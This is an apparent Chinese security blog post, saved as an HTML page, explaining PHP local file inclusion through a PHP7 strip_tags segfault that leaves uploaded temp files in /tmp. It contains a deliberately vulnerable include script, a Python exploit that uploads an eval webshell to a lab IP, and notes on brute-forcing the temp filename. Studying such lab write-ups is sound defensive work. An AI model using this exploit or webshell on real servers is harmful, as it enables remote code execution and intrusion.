@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP LFI的两种姿势(PHP7崩溃+phpinfo缓存文件) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP LFI的两种姿势(PHP7崩溃+phpinfo缓存文件)</h2>
+            <div class="post-date">2020-01-05</div>
+            
+            <div class="post-content">
+              <p><strong>一：LFI+PHP7崩溃</strong><br>
+<code>php7 segment fault特性</code><br>
+所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了tmp目录<br>
+我们可以用string.strip_tags的方式来造成segment fault，并且请求中包含上传文件。<br>
+<code>http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</code><br>
+<strong>漏洞环境</strong></p>
+<pre><code>dir.php
+&lt;?php
+$a= @$_GET['dir'];
+if(!$a){
+$a = '/tmp';
+}
+var_dump(scandir($a));
+?&gt;
+</code></pre>
+<pre><code>ifi.php
+&lt;?php
+include $_GET['file'];
+?&gt;
+</code></pre>
+<p>当我们发送单纯的GET请求时。php出现了错误<br>
+<img src="https://guokeya.github.io/post-images/1578207371032.png" alt="" loading="lazy"><br>
+exp:</p>
+<pre><code>import requests
+from io import BytesIO
+import re
+file_data={
+	'file': BytesIO(&quot;&lt;?php eval($_GET[1]);&quot;)
+}
+url=&quot;http://192.168.0.237/lfi.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;
+try:
+	r=requests.post(url=url,files=file_data,allow_redirects=False)
+    #模拟文件上传
+except:
+	url=&quot;http://192.168.0.237/dir.php&quot;
+	r=requests.get(url)		
+	print(r.content)
+</code></pre>
+<p>php开头的那个文件。就是PHP异常退出留下的缓存文件<br>
+<img src="https://guokeya.github.io/post-images/1578207451719.png" alt="" loading="lazy"><br>
+包含getshell<br>
+<img src="https://guokeya.github.io/post-images/1578207498239.png" alt="" loading="lazy"><br>
+假如我们没有dir.php。那该怎么知道文件名呢。暴力破解。。。<br>
+这个文件名由php+6位[a-zA-Z0-9]组成<br>
+<img src="https://guokeya.github.io/post-images/1578207702425.png" alt="" loading="lazy"><br>
+也可以多执行几次脚本。缓存文件越多破解越快</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/UtMQ2MAtQ/">
+                  <h3 class="post-title">
+                    浅析Unicode安全
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
